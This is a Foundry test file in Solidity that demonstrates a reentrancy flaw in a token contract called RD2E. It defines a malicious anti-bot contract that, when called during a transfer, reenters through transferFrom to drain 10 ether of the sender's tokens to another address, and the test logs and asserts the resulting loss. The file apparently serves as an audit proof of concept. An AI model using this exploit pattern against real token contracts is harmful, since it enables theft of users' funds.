// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/RD2E.sol";

contract MaliciousAntiBot {
    RD2E public token;
    bool public attacked = false;
    address constant TRANSFER_TARGET = address(0xA);

    constructor(address _token) {
        token = RD2E(_token);
    }

    function protect(address sender, address, uint256) external returns (uint256) {
        if (!attacked) {
            attacked = true;
            token.transferFrom(sender, TRANSFER_TARGET, 10 ether);
        }
        return 1 ether;
    }

    function reset() public {
        attacked = false;
    }
}

contract RD2EAtomicityTest is Test {
    RD2E public token;
    MaliciousAntiBot public maliciousBot;
    address constant USER = address(0x1);
    address constant ADDRESS_1 = address(0x2);
    address constant ADDRESS_0xA = address(0xA);
    address constant ADDRESS_0xB = address(0xB);
    uint256 constant INITIAL_BALANCE = 1000 ether;

    function setUp() public {
        token = new RD2E();
        maliciousBot = new MaliciousAntiBot(address(token));
        
        token.setDevAddress(ADDRESS_0xB);
        token.setAntiBotAddress(address(maliciousBot));
        token.setAntiBnotEnabled(true);
        
        token.mint(USER, INITIAL_BALANCE);
        vm.prank(USER);
        token.approve(address(maliciousBot), type(uint256).max);
    }

    function testReentrancyInTransfer() public {
        maliciousBot.reset();
        
        console.log("\n--- BEFORE-Trigger State ---");
        // Capture pre-transfer balances
        uint256 userBalanceBefore = token.balanceOf(USER);
        uint256 addr1BalanceBefore = token.balanceOf(ADDRESS_1);
        uint256 addr0xABalanceBefore = token.balanceOf(ADDRESS_0xA);
        uint256 addr0xBBalanceBefore = token.balanceOf(ADDRESS_0xB);
        
        console.log("USER balance:     ", userBalanceBefore);
        console.log("ADDRESS_1 balance:", addr1BalanceBefore);
        console.log("ADDRESS_0xA balance: ", addr0xABalanceBefore);
        console.log("ADDRESS_0xB balance: ", addr0xBBalanceBefore);
        
        console.log("\n--- Trigger Reentrancy Transfer ---");
        // Trigger reentrant transfer
        vm.prank(USER);
        token.transfer(ADDRESS_1, 100 ether);
        
        console.log("\n--- AFTER-Trigger State ---");
        // Record post-transfer balances
        uint256 userBalanceAfter = token.balanceOf(USER);
        uint256 addr1BalanceAfter = token.balanceOf(ADDRESS_1);
        uint256 addr0xABalanceAfter = token.balanceOf(ADDRESS_0xA);
        uint256 addr0xBBalanceAfter = token.balanceOf(ADDRESS_0xB);
        
        console.log("USER balance:     ", userBalanceAfter);
        console.log("ADDRESS_1 balance:", addr1BalanceAfter);
        console.log("ADDRESS_0xA balance: ", addr0xABalanceAfter);
        console.log("ADDRESS_0xB balance: ", addr0xBBalanceAfter);
        
        // Compute balance changes
        uint256 userLoss = userBalanceBefore - userBalanceAfter;
        uint256 addr0xAProfit = addr0xABalanceAfter - addr0xABalanceBefore;
        
        // Vulnerability validation logic
        if (addr0xAProfit == 10 ether && userLoss == 110 ether) {
            console.log("\nValidation Result: Reentrancy occurred - 10 ether to 0xA, 110 ether total loss");
            console.log("Vulnerability Exists: Successful reentrancy attack detected in transfer function");
        } else {
            console.log("\nValidation Result: Expected state changes not detected");
            console.log("Vulnerability not Exist: Reentrancy attack was not executed as expected");
        }
        
        // Original assertions
        assertTrue(maliciousBot.attacked());
        assertEq(
            token.balanceOf(USER),
            INITIAL_BALANCE - 110 ether,
            "User balance mismatch"
        );
    }
}